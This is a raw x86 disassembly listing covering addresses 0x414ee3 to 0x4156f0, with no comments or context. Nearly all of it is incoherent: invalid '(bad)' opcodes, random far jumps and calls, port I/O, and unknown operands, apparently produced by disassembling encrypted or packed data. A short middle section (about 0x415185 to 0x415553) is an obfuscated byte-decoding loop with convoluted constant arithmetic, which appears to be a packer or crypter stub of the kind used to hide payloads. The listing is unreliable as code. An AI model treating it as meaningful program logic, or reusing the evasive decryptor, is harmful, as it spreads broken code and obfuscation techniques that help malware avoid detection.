  414ee3:	dec    ecx
  414ee4:	sub    eax,0xa9fa26cd
  414ee9:	mov    BYTE PTR [ecx+0x5ce435c0],ah
  414eef:	and    eax,0x202c4fb4
  414ef4:	or     eax,0xf40f4711
  414ef9:	add    eax,0x11
  414efc:	xor    BYTE PTR [edi-0x23],al
  414eff:	iret   
  414f00:	xlat   BYTE PTR ds:[ebx]
  414f01:	fwait
  414f02:	sti    
  414f03:	xchg   edx,eax
  414f04:	aaa    
  414f05:	lahf   
  414f06:	addr16 push edi
  414f08:	jmp    0x5c3ec8ea
  414f0d:	call   0xe070:0xe3b97267
  414f14:	jns    0x414ebe
  414f16:	push   cs
  414f17:	sub    eax,0x3ff8adfb
  414f1c:	(bad)  
  414f1d:	jmp    0x414f36
  414f1f:	sub    esp,DWORD PTR [edi+0x2eadcd01]
  414f25:	pop    ecx
  414f26:	add    cl,BYTE PTR ds:0x71cf5828
  414f2c:	(bad)  
  414f2d:	mov    ebx,0xf1c10056
  414f32:	fucom  st(7)
  414f34:	repnz mov al,ds:0xe221b87a
  414f3a:	dec    edi
  414f3b:	retf   
  414f3c:	test   BYTE PTR [eax],bl
  414f3e:	repnz dec edx
  414f40:	mov    al,0xf6
  414f42:	adc    edi,DWORD PTR [ebx-0x16]
  414f45:	or     BYTE PTR [ebx-0x7a],ch
  414f48:	sub    eax,0x4bd41dbf
  414f4d:	repz push edx
  414f4f:	xchg   edx,eax
  414f50:	xchg   esi,eax
  414f51:	rcl    BYTE PTR fs:0x17031f64,0xd9
  414f59:	push   edi
  414f5a:	xor    ecx,DWORD PTR [esi]
  414f5c:	lods   eax,DWORD PTR ds:[esi]
  414f5d:	sub    eax,0xe67b7bea
  414f62:	xor    al,0xfb
  414f64:	les    ecx,FWORD PTR [ebx+0x23]
  414f67:	add    edx,DWORD PTR [ebx+edi*8]
  414f6a:	sbb    ebp,ebx
  414f6c:	fcmovb st,st(0)
  414f6e:	scas   eax,DWORD PTR es:[edi]
  414f6f:	repz jmp 0x414fbf
  414f72:	ins    DWORD PTR es:[edi],dx
  414f73:	ds in  eax,dx
  414f75:	mov    ah,0xb7
  414f77:	pop    es
  414f78:	out    0xea,eax
  414f7a:	jp     0x414fda
  414f7c:	std    
  414f7d:	stos   BYTE PTR es:[edi],al
  414f7e:	fadd   DWORD PTR [edi-0x56d1b0cd]
  414f84:	rcr    BYTE PTR [ecx-0x48e7a0dc],0x1c
  414f8b:	sbb    BYTE PTR [eax],al
  414f8d:	fist   WORD PTR [ebp+edi*4+0x2a]
  414f91:	xlat   BYTE PTR ds:[ebx]
  414f92:	bound  edi,QWORD PTR [edx]
  414f94:	or     ebp,DWORD PTR [edx+0x2b]
  414f97:	xchg   edi,eax
  414f98:	out    dx,eax
  414f99:	jns    0x414fe2
  414f9b:	push   esi
  414f9c:	mov    al,ds:0x82aa1c54
  414fa1:	push   esp
  414fa2:	scas   al,BYTE PTR es:[edi]
  414fa3:	pusha  
  414fa4:	pop    edi
  414fa5:	mov    al,ds:0x901a0bfd
  414faa:	or     eax,0x832a2416
  414faf:	out    dx,al
  414fb0:	lds    esi,FWORD PTR [edx]
  414fb2:	mov    cl,BYTE PTR [edi]
  414fb4:	in     al,dx
  414fb5:	jne    0x414f9a
  414fb7:	mov    ecx,0xe3b92d29
  414fbc:	sub    DWORD PTR fs:[ecx-0x61],0x976c0712
  414fc4:	test   eax,0x3b6fbff9
  414fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fca:	mov    ds:0x4596b739,eax
  414fcf:	shr    ebp,cl
  414fd1:	retf   
  414fd2:	shl    BYTE PTR [esi],1
  414fd4:	xchg   BYTE PTR [eax+0x59f0ccdb],ch
  414fda:	sahf   
  414fdb:	addr16 mov ds:0x88ef,eax
  414fdf:	or     dl,ah
  414fe1:	push   cs
  414fe2:	push   edx
  414fe3:	pop    es
  414fe4:	jo     0x415059
  414fe6:	popw   es
  414fe8:	jg     0x414fc7
  414fea:	dec    ebp
  414feb:	sbb    eax,0x722b881c
  414ff0:	jecxz  0x414f9c
  414ff2:	into   
  414ff3:	retf   
  414ff4:	bound  esi,QWORD PTR [ebx+0x70]
  414ff7:	cld    
  414ff8:	cmp    ah,al
  414ffa:	push   edi
  414ffb:	(bad)  
  414ffc:	in     eax,0xb3
  414ffe:	shl    ecx,0xa3
  415001:	rcr    DWORD PTR [ebx],cl
  415003:	lods   al,BYTE PTR gs:[esi]
  415005:	sbb    eax,0x85fee969
  41500a:	cld    
  41500b:	push   ebp
  41500c:	pushf  
  41500d:	fldenv [edx]
  41500f:	xor    eax,0x7865bf4b
  415014:	push   edi
  415015:	das    
  415016:	pop    ebx
  415017:	and    ecx,edi
  415019:	int3   
  41501a:	ja     0x414ff8
  41501c:	xchg   ebx,eax
  41501d:	adc    eax,DWORD PTR [esi+0x73]
  415020:	mov    eax,esp
  415022:	jge    0x41508e
  415024:	dec    eax
  415025:	adc    esi,DWORD PTR [eax-0x4a38d36f]
  41502b:	mov    ds:0xb3d201e3,al
  415030:	mov    edi,0xdcd72de6
  415035:	aam    0xf4
  415037:	mov    ebx,0x38be9488
  41503c:	cmp    BYTE PTR [ebp-0x565c5d5],0xd4
  415043:	pop    edx
  415044:	mov    bh,0x6c
  415046:	gs xchg ecx,eax
  415048:	mov    al,0xbf
  41504a:	je     0x414ff1
  41504c:	or     DWORD PTR [edi-0x8],edx
  41504f:	(bad)  
  415050:	xlat   BYTE PTR ds:[ebx]
  415051:	dec    esp
  415052:	xor    BYTE PTR [ebp-0x5761eb6b],ah
  415058:	xor    DWORD PTR [ebx],edi
  41505a:	ds xor al,0x25
  41505d:	ret    
  41505e:	adc    al,0x1e
  415060:	pop    ebx
  415061:	(bad)  
  415062:	loope  0x41505d
  415064:	pop    esi
  415065:	dec    esp
  415066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415067:	dec    ebx
  415068:	sbb    eax,0x73993d10
  41506d:	out    dx,eax
  41506e:	ja     0x41506c
  415070:	out    dx,eax
  415071:	adc    al,0xc
  415073:	retf   
  415074:	dec    ecx
  415075:	sti    
  415076:	or     eax,0xc354c95f
  41507b:	inc    ebx
  41507c:	jnp    0x415022
  41507e:	jecxz  0x41501c
  415080:	shl    BYTE PTR [ebp-0x37],1
  415083:	std    
  415084:	adc    DWORD PTR [ebp+eiz*8-0x76f09fec],0xffffffac
  41508c:	add    ah,BYTE PTR [esi]
  41508e:	push   ecx
  41508f:	call   FWORD PTR [eax+ebx*2]
  415092:	xor    al,0x82
  415094:	cs adc dl,ch
  415097:	cmp    al,0x45
  415099:	(bad)  
  41509a:	mov    edi,0x68d5d4ee
  41509f:	adc    BYTE PTR [ebp+0x2e3b12b7],0xc5
  4150a6:	mov    ds:0x91cd33a3,eax
  4150ab:	jbe    0x41510a
  4150ad:	call   0x4c69376b
  4150b2:	hlt    
  4150b3:	adc    eax,0xdc3717e9
  4150b8:	iret   
  4150b9:	and    DWORD PTR [edx+ebx*4+0x7d],ebx
  4150bd:	xchg   ecx,eax
  4150be:	out    0x71,eax
  4150c0:	stc    
  4150c1:	clc    
  4150c2:	sahf   
  4150c3:	int3   
  4150c4:	test   al,0xc
  4150c6:	xchg   ebx,eax
  4150c7:	test   eax,0x33f53530
  4150cc:	jae    0x41513a
  4150ce:	or     BYTE PTR [ecx],0x4b
  4150d1:	ficomp DWORD PTR [eax]
  4150d3:	add    al,BYTE PTR [ebx]
  4150d5:	jmp    0x95efac2a
  4150da:	fcomp  DWORD PTR [ecx]
  4150dc:	dec    esp
  4150dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150de:	repz pop es
  4150e0:	mov    ch,0xfd
  4150e2:	adc    bl,BYTE PTR [ebp+0x5b]
  4150e5:	iret   
  4150e6:	pop    ss
  4150e7:	hlt    
  4150e8:	inc    ecx
  4150e9:	inc    ebx
  4150ea:	pop    ecx
  4150eb:	add    al,0x2d
  4150ed:	ret    
  4150ee:	neg    BYTE PTR [ebx]
  4150f0:	add    al,0x8d
  4150f2:	jb     0x415095
  4150f4:	addr16 pop eax
  4150f6:	ret    
  4150f7:	jae    0x415116
  4150f9:	sbb    eax,0xa1db32a3
  4150fe:	mov    ah,0x92
  415100:	push   ebx
  415101:	daa    
  415102:	xchg   edx,eax
  415103:	outs   dx,BYTE PTR ds:[esi]
  415104:	cwde   
  415105:	fild   QWORD PTR [ebp+0x11]
  415108:	pop    ebp
  415109:	call   0x2c70e285
  41510e:	mov    es,WORD PTR [ecx+0x5d25d23f]
  415114:	scas   al,BYTE PTR es:[edi]
  415115:	retf   
  415116:	cmp    dl,0x30
  415119:	scas   al,BYTE PTR es:[edi]
  41511a:	cli    
  41511b:	ds nop
  41511d:	jecxz  0x415114
  41511f:	cmp    eax,0x8dae3e2e
  415124:	xchg   esi,eax
  415125:	bound  ebp,QWORD PTR [ecx-0xfe208f8]
  41512b:	out    0xb1,al
  41512d:	and    ecx,esi
  41512f:	cmp    al,0xe4
  415131:	mov    ecx,0xa6fb8368
  415136:	push   esi
  415137:	out    0xf2,al
  415139:	cmp    BYTE PTR [eax],0xbd
  41513c:	mov    cl,bh
  41513e:	stos   BYTE PTR es:[edi],al
  41513f:	test   BYTE PTR [ebx+0x6a8df5a7],bh
  415145:	gs add BYTE PTR gs:[eax],dl
  415149:	and    DWORD PTR [ebp+0x3699f216],edi
  41514f:	xchg   ebx,eax
  415150:	jns    0x41519f
  415152:	push   ds
  415153:	out    dx,eax
  415154:	in     al,dx
  415155:	(bad)  
  415156:	sub    esi,DWORD PTR [edi]
  415158:	adc    eax,0x94c45125
  41515d:	push   ebp
  41515e:	sub    al,0x86
  415160:	(bad)  
  415161:	dec    ecx
  415162:	and    edx,ebx
  415164:	dec    edx
  415165:	dec    edx
  415166:	push   edi
  415167:	in     eax,0x5f
  415169:	xchg   ecx,eax
  41516a:	inc    ebx
  41516b:	push   edi
  41516c:	push   es
  41516d:	xchg   ebx,eax
  41516e:	add    eax,0x76a50bfc
  415173:	not    BYTE PTR ds:0x9496b339
  415179:	pop    eax
  41517a:	mov    esi,0x6a4bf09e
  41517f:	je     0x41592b
  415185:	mov    DWORD PTR [ebp-0x18],0x1001
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	ins    DWORD PTR es:[edi],dx
  4151a5:	sbb    al,0x1a
  4151a7:	sar    DWORD PTR [eax+esi*4],1
  4151aa:	mov    esi,0xbec4edbe
  4151af:	mov    esi,0xdb360156
  4151b4:	jg     0x415157
  4151b6:	pop    esi
  4151b7:	loop   0x415220
  4151b9:	jmp    0x415190
  4151bb:	je     0x415162
  4151bd:	aas    
  4151be:	inc    esi
  4151bf:	btc    DWORD PTR [ecx+0x718056ba],esp
  4151c6:	ret    0xd78d
  4151c9:	cmc    
  4151ca:	repz push ds
  4151cc:	je     0x415248
  4151ce:	call   0x5e9b:0x81fbe84c
  4151d5:	push   ebp
  4151d6:	rcr    BYTE PTR [ecx],0xed
  4151d9:	dec    esi
  4151da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151db:	(bad)  
  4151dc:	mov    al,ds:0xbf1cb860
  4151e1:	mov    esi,0x49d09475
  4151e6:	sub    al,0x8d
  4151e8:	mov    al,0xb1
  4151ea:	mov    edx,0x6de14516
  4151ef:	sahf   
  4151f0:	pushf  
  4151f1:	jb     0x4151db
  4151f3:	mov    esp,0x82418c1
  4151f8:	loop   0x415188
  4151fa:	jp     0x4151c0
  4151fc:	fcomp  DWORD PTR [esp+edi*4-0x4c]
  415200:	pop    ebp
  415201:	dec    ebp
  415202:	vmwrite edx,DWORD PTR [esi]
  415205:	cdq    
  415206:	fwait
  415207:	push   es
  415208:	sbb    DWORD PTR [esi+0x3b],ebp
  41520b:	sbb    al,0xf6
  41520d:	lea    ebx,[ebx-0x22678420]
  415213:	sbb    dh,BYTE PTR [edx]
  415215:	add    ah,BYTE PTR [ebx]
  415217:	mov    ah,0xc7
  415219:	fcomp  QWORD PTR [ebp+0xa5df935]
  41521f:	pop    ebx
  415220:	(bad)  
  415221:	inc    ecx
  415222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415223:	jge    0x415235
  415225:	inc    edx
  415226:	imul   esp,DWORD PTR [esi],0xb30396dd
  41522c:	and    ah,ch
  41522e:	ficom  DWORD PTR ds:0xe79699b4
  415234:	mov    DWORD PTR [eax-0x30],edx
  415237:	dec    ebp
  415238:	sbb    al,0x38
  41523a:	inc    esi
  41523b:	(bad)  
  41523c:	stc    
  41523d:	jg     0x415242
  41523f:	fld    QWORD PTR ss:[ecx-0x71]
  415243:	rcr    BYTE PTR [edi-0x2e72a71a],0xf0
  41524a:	mov    ah,0xd7
  41524c:	inc    ebp
  41524d:	dec    ebx
  41524e:	cwde   
  41524f:	mov    cl,BYTE PTR [eax-0x4e1ac3ee]
  415255:	call   0xed63:0xd5ce2bec
  41525c:	add    ah,BYTE PTR [esi+0x5375ef58]
  415262:	adc    BYTE PTR [esi-0x67],bl
  415265:	(bad)  
  415266:	jae    0x415247
  415268:	clc    
  415269:	icebp  
  41526a:	stos   BYTE PTR es:[edi],al
  41526b:	into   
  41526c:	data16 jp 0x415276
  41526f:	inc    ebp
  415270:	inc    esi
  415271:	cli    
  415272:	adc    al,0xb0
  415275:	outs   dx,BYTE PTR ds:[esi]
  415276:	scas   eax,DWORD PTR es:[edi]
  415277:	push   cs
  415278:	pop    esp
  415279:	stos   DWORD PTR es:[edi],eax
  41527a:	and    al,0xe0
  41527c:	mov    dh,0xc4
  41527e:	mov    bh,0x41
  415280:	mov    DWORD PTR [edx-0x272a003f],edx
  415286:	pop    ss
  415287:	(bad)  
  415289:	pop    ecx
  41528a:	xchg   ecx,ebp
  41528c:	adc    eax,DWORD PTR [eax-0x25]
  41528f:	xor    BYTE PTR cs:[ebx-0xdfcd394],bh
  415296:	clc    
  415297:	dec    ebp
  415298:	sbb    eax,0x6fb8c79f
  41529d:	and    edi,DWORD PTR fs:[ecx+0x23]
  4152a1:	or     al,0x5d
  4152a3:	retf   0xc33d
  4152a6:	fisttp QWORD PTR cs:[edx+edi*4]
  4152aa:	int3   
  4152ab:	popf   
  4152ac:	xchg   esi,eax
  4152ad:	cwde   
  4152ae:	fmul   QWORD PTR [eax+eax*4-0x227356d6]
  4152b5:	fcom   st(7)
  4152b7:	ins    BYTE PTR es:[edi],dx
  4152b8:	jmp    0xf1b7:0x7f5fd5b9
  4152bf:	in     eax,dx
  4152c0:	cmp    BYTE PTR [esi+0x35],ah
  4152c3:	aas    
  4152c4:	xor    bl,al
  4152c6:	add    edi,esi
  4152c8:	pop    ds
  4152c9:	mov    BYTE PTR [esi+edi*2],bh
  4152cc:	call   0xd18e5509
  4152d1:	push   ebp
  4152d2:	repz mov dl,0x30
  4152d5:	cs jp  0x41525e
  4152d8:	fsubr  DWORD PTR [ebx-0x78]
  4152db:	sahf   
  4152dc:	sti    
  4152dd:	add    al,0xd5
  4152df:	cs sbb edx,edi
  4152e2:	mov    ebx,0xb89d345
  4152e7:	pop    ds
  4152e8:	inc    edx
  4152e9:	lahf   
  4152ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152eb:	xor    BYTE PTR [esi],ah
  4152ed:	sar    BYTE PTR [ebp+0x6766d058],0x22
  4152f4:	jne    0x41533c
  4152f6:	stos   BYTE PTR es:[edi],al
  4152f7:	nop
  4152f8:	sbb    BYTE PTR [edi],ah
  4152fa:	or     BYTE PTR [eax],ch
  4152fc:	lods   eax,DWORD PTR ds:[esi]
  4152fd:	push   esp
  4152fe:	pop    edi
  4152ff:	dec    edi
  415300:	pusha  
  415301:	loop   0x4152d7
  415303:	mov    BYTE PTR [edx-0x424c2832],dl
  415309:	and    edx,eax
  41530b:	fs dec ecx
  41530d:	test   eax,0xff45b9ab
  415312:	mov    esp,0xb212e4b
  415317:	ins    BYTE PTR es:[edi],dx
  415318:	push   ecx
  415319:	(bad)
  41531c:	add    eax,DWORD PTR [esi+0x71379a76]
  415322:	call   0x9ff5:0xbb546437
  415329:	push   0x62
  41532b:	fst    DWORD PTR [edx+0xe]
  41532e:	fs push 0x55
  415331:	mov    ah,0xd6
  415333:	into   
  415334:	pop    esp
  415335:	jbe    0x415365
  415337:	dec    ecx
  415338:	jmp    0x67ea:0xf0b4d25f
  41533f:	mov    WORD PTR [eax+ecx*2],?
  415342:	add    edx,DWORD PTR [edi-0x3bfb107f]
  415348:	sub    dl,bh
  41534a:	mov    ebp,0xcf7fd303
  41534f:	jp     0x4153c4
  415351:	rcl    ecx,1
  415353:	jmp    0x145c:0x5c2b3fd9
  41535a:	xchg   edi,eax
  41535b:	sub    eax,0x41bd186c
  415360:	test   DWORD PTR [ebx],ebp
  415362:	adc    eax,0xa179373f
  415367:	aam    0x92
  415369:	xor    eax,DWORD PTR [ebx]
  41536b:	adc    dl,BYTE PTR [ebx-0x20]
  41536e:	adc    edx,DWORD PTR [esi+0x40905c35]
  415374:	and    ebx,edi
  415376:	ret    0x1b5d
  415379:	pop    ds
  41537a:	mov    dh,0xa1
  41537c:	mov    bh,0xb9
  41537e:	push   edx
  41537f:	pop    ss
  415380:	(bad)  
  415382:	out    0x36,eax
  415384:	(bad)  
  415385:	cs in  eax,dx
  415387:	out    0xec,eax
  415389:	pushf  
  41538a:	out    0x11,eax
  41538c:	mov    al,0xdb
  41538e:	mov    eax,0x9ccb63e3
  415393:	add    DWORD PTR [ecx-0x5435d345],ebx
  415399:	jge    0x4153be
  41539b:	leave  
  41539c:	sub    DWORD PTR [esi+0x69],ebx
  41539f:	pop    ebp
  4153a0:	pop    ebx
  4153a1:	aam    0xa1
  4153a3:	test   eax,0x520885ca
  4153a8:	jmp    0x4153f8
  4153aa:	fadd   DWORD PTR [eax+0x19e58f29]
  4153b0:	mov    ds,WORD PTR [ecx+0x48860bcb]
  4153b6:	mov    al,ds:0xab68eb0a
  4153bb:	es cmp bl,ch
  4153be:	lds    edx,FWORD PTR [esi+eiz*1-0x41f98e98]
  4153c5:	mov    eax,0x84a14f3c
  4153ca:	xchg   esp,eax
  4153cb:	in     al,dx
  4153cc:	js     0x415351
  4153ce:	test   BYTE PTR [eax],ah
  4153d0:	jmp    0x41541f
  4153d2:	(bad)  
  4153d3:	fsubr  QWORD PTR [edi]
  4153d5:	dec    ebp
  4153d6:	or     BYTE PTR [edx+edx*8-0x34],0x42
  4153db:	dec    ebp
  4153dc:	bound  bx,DWORD PTR [ebx]
  4153df:	jns    0x41536b
  4153e1:	pop    edx
  4153e2:	sbb    eax,0xb1d07efa
  4153e7:	adc    DWORD PTR [edx-0x23],0x5444ce5c
  4153ee:	sub    eax,0xe94d5108
  4153f3:	inc    edx
  4153f4:	xor    eax,0x5174d550
  4153f9:	rol    ebp,1
  4153fb:	xchg   ecx,eax
  4153fc:	aad    0x3e
  4153fe:	mov    WORD PTR [edi-0x2828b987],?
  415404:	enter  0x4374,0xf
  415408:	sbb    DWORD PTR [ecx+0x72ca9c8d],0x2f
  41540f:	adc    dl,0x5b
  415412:	pop    ebx
  415413:	pop    esp
  415414:	nop
  415415:	jbe    0x4153cf
  415417:	xchg   esi,eax
  415418:	push   edi
  415419:	shr    esi,cl
  41541b:	xor    DWORD PTR [eax-0x68e59189],0xe6e972b1
  415425:	shl    DWORD PTR [ebx+0x8efac0a],cl
  41542b:	push   gs
  41542d:	or     ebx,DWORD PTR [ecx+0x70]
  415430:	mov    ds:0x3d736def,eax
  415435:	sahf   
  415436:	ror    DWORD PTR [edi-0x23],1
  415439:	inc    edi
  41543a:	add    DWORD PTR fs:[ecx+0x41a65167],edx
  415441:	rcl    bh,cl
  415443:	pop    ds
  415444:	retf   
  415445:	jb     0x415400
  415447:	mov    bh,0xcd
  415449:	xchg   edx,eax
  41544a:	stos   DWORD PTR es:[edi],eax
  41544b:	clc    
  41544c:	mov    bl,0x16
  41544e:	test   BYTE PTR ds:0x253f363d,ah
  415454:	loope  0x4154cf
  415456:	add    edi,eax
  415458:	das    
  415459:	push   ebp
  41545a:	dec    ecx
  41545b:	repnz xchg edx,eax
  41545d:	test   dh,0x93
  415460:	seto   bl
  415463:	imul   edi,DWORD PTR [esi],0x4030a9b
  415469:	mov    ?,WORD PTR [esi+0x1b65109f]
  41546f:	jecxz  0x4153f1
  415471:	cwde   
  415472:	mov    bl,0xb6
  415474:	add    eax,0x370a2d5e
  415479:	jp     0x41546d
  41547b:	pop    es
  41547c:	test   DWORD PTR [ebp+0x5c85fae0],eax
  415482:	jmp    0xb574:0x6e9812dd
  415489:	add    DWORD PTR [ebp-0x6a],edx
  41548c:	fbstp  TBYTE PTR [esi-0x119da771]
  415492:	outs   dx,BYTE PTR ds:[esi]
  415493:	inc    eax
  415494:	and    ebx,DWORD PTR [ecx-0x5e]
  415497:	sub    eax,0x59f7b5b8
  41549c:	jnp    0x4154b4
  41549e:	pop    edx
  41549f:	pop    esi
  4154a0:	shl    dh,1
  4154a2:	cld    
  4154a3:	out    dx,al
  4154a4:	sub    BYTE PTR ds:0x173e7085,0xf9
  4154ab:	inc    esi
  4154ac:	add    BYTE PTR [edx-0x4d3230a0],0xdd
  4154b3:	sbb    bh,BYTE PTR [eax+0x3d3cc614]
  4154b9:	push   ds
  4154ba:	and    eax,0x2aa5517d
  4154bf:	adc    edx,DWORD PTR [edx]
  4154c1:	cmp    al,0x33
  4154c3:	push   0x4c
  4154c5:	pop    esi
  4154c6:	jl     0x415461
  4154c8:	clc    
  4154c9:	inc    ebx
  4154ca:	push   ss
  4154cb:	cdq    
  4154cc:	je     0x415550
  4154d2:	mov    al,BYTE PTR [ecx+edi*1]
  4154d5:	mov    BYTE PTR [ebp-0x1],al
  4154d8:	mov    BYTE PTR [ebp-0x3],0x74
  4154dc:	mov    BYTE PTR [ebp-0x2],0x16
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fnsave [ebp+0x6cdd7476]
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	jne    0x415529
  41558f:	(bad)
  415593:	or     ah,BYTE PTR [ebp+0x59987cf2]
  415599:	ss adc eax,0xc86253c6
  41559f:	cdq    
  4155a0:	mov    ds:0xb6241d0a,al
  4155a5:	pusha  
  4155a6:	fdiv   DWORD PTR [ebp-0x2913128b]
  4155ac:	xor    BYTE PTR [edi+0x31],cl
  4155af:	xlat   BYTE PTR ds:[ebx]
  4155b0:	or     DWORD PTR [esi+0x73],0xe44e87e8
  4155b7:	fcom   DWORD PTR [ecx*8-0x7edec3f7]
  4155be:	pop    ebx
  4155bf:	dec    ecx
  4155c0:	inc    edi
  4155c1:	cmc    
  4155c2:	mov    dl,0xa2
  4155c4:	je     0x415621
  4155c6:	unpcklps xmm0,XMMWORD PTR [edx+0xa3a933f]
  4155cd:	mov    ebp,0xed5231fe
  4155d2:	jns    0x41555f
  4155d4:	das    
  4155d5:	add    bl,BYTE PTR [edx+0x77]
  4155d8:	bnd js 0x415618
  4155db:	push   es
  4155dc:	xor    eax,0x29aee70e
  4155e1:	pop    ecx
  4155e2:	xor    DWORD PTR [ebx],edx
  4155e4:	loope  0x415660
  4155e6:	nop
  4155e7:	lahf   
  4155e8:	data16 das 
  4155ea:	stos   DWORD PTR es:[edi],eax
  4155eb:	xchg   edi,eax
  4155ec:	ror    BYTE PTR [esi-0x55d894ec],0x95
  4155f3:	add    DWORD PTR [ecx+edx*2-0x6e],edi
  4155f7:	cdq    
  4155f8:	scas   eax,DWORD PTR es:[edi]
  4155f9:	pop    ds
  4155fa:	xchg   ecx,eax
  4155fb:	jl     0x41558c
  4155fd:	popa   
  4155fe:	lods   eax,DWORD PTR ds:[esi]
  4155ff:	sub    ebx,DWORD PTR [eax+0xd]
  415602:	mov    eax,0x9e4b9dc5
  415607:	imul   esi,DWORD PTR gs:[ebx+0x2f083a9b],0xb94fbcef
  415612:	aas    
  415613:	pop    esp
  415614:	dec    esp
  415615:	jmp    0x415672
  415617:	cld    
  415618:	shl    DWORD PTR [ebp+0x6ea160fb],0x1c
  41561f:	xchg   BYTE PTR [edx+esi*4+0x33],dl
  415623:	pop    eax
  415624:	mov    cl,0x62
  415626:	push   ebx
  415627:	lods   eax,DWORD PTR ds:[esi]
  415628:	add    esp,edx
  41562a:	jg     0x4156a5
  41562c:	pusha  
  41562d:	adc    al,0x5a
  41562f:	mov    WORD PTR [ecx-0xef81cbb],fs
  415635:	iret   
  415636:	(bad)  
  415637:	repz dec ebp
  415639:	fisubr DWORD PTR [ebp-0x2910bb25]
  41563f:	or     dh,BYTE PTR [ebx-0x34a22316]
  415645:	adc    eax,ecx
  415647:	jns    0x415680
  415649:	cmp    DWORD PTR [ecx-0x28],esp
  41564c:	sbb    edi,DWORD PTR [eax+0x119d20]
  415652:	sub    ecx,DWORD PTR [ecx-0x1ad4cca7]
  415658:	push   0x970d28d6
  41565d:	outs   dx,BYTE PTR ds:[esi]
  41565e:	addr16 ja 0x4155ed
  415661:	cmp    dh,al
  415663:	jle    0x4156c9
  415665:	cmp    eax,0x8f884387
  41566a:	add    BYTE PTR [edx-0x7e],ah
  41566d:	dec    ecx
  41566e:	fs pop ds
  415670:	push   es
  415671:	cmp    edx,ebx
  415673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415674:	out    0x6c,eax
  415676:	cmp    DWORD PTR [esi+0x2f1ac904],edx
  41567c:	inc    DWORD PTR [ebx-0x308ef4f9]
  415682:	cmp    al,BYTE PTR [ecx]
  415684:	aas    
  415685:	push   ebp
  415686:	fcmovnu st,st(0)
  415688:	fdivr  st(7),st
  41568a:	jns    0x41569e
  41568c:	jp     0x4156e8
  41568e:	dec    eax
  41568f:	imul   esp,DWORD PTR [esi-0x6107c5a3],0xaa8ee02e
  415699:	xchg   edx,eax
  41569a:	das    
  41569b:	scas   al,BYTE PTR es:[edi]
  41569c:	ins    DWORD PTR es:[edi],dx
  41569d:	lds    ecx,FWORD PTR [ebx+0x74]
  4156a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156a1:	enter  0x793d,0x32
  4156a5:	xchg   esi,eax
  4156a6:	imul   esi,edi,0xfab9fdc0
  4156ac:	mov    bh,0x3a
  4156ae:	pop    ecx
  4156af:	stos   BYTE PTR es:[edi],al
  4156b0:	xchg   BYTE PTR [edi+ecx*4-0x7aa188fe],bh
  4156b7:	cmp    BYTE PTR [ebp+0x2f69d4be],0xa6
  4156be:	push   eax
  4156bf:	cwde   
  4156c0:	cmp    eax,DWORD PTR [edx-0x20]
  4156c3:	add    bh,dl
  4156c5:	test   BYTE PTR [ecx],ah
  4156c7:	cdq    
  4156c8:	cmp    esp,DWORD PTR [ecx+0x37]
  4156cb:	push   0xf9d53b4b
  4156d0:	in     al,0xf4
  4156d2:	pop    ebx
  4156d3:	push   edx
  4156d4:	push   0x4a036ad6
  4156d9:	loope  0x4156fa
  4156db:	data16 sti 
  4156dd:	aam    0xf8
  4156df:	int    0x8c
  4156e1:	sub    al,0x33
  4156e3:	addr16 push esi
  4156e5:	cmp    ah,bh
  4156e7:	pop    esi
  4156e8:	cdq    
  4156e9:	add    ebp,DWORD PTR [ecx+0x5c]
  4156ec:	jmp    0x4156da
  4156ee:	sub    al,0x3a
  4156f0:	or     edx,DWORD PTR [edi-0x6c]
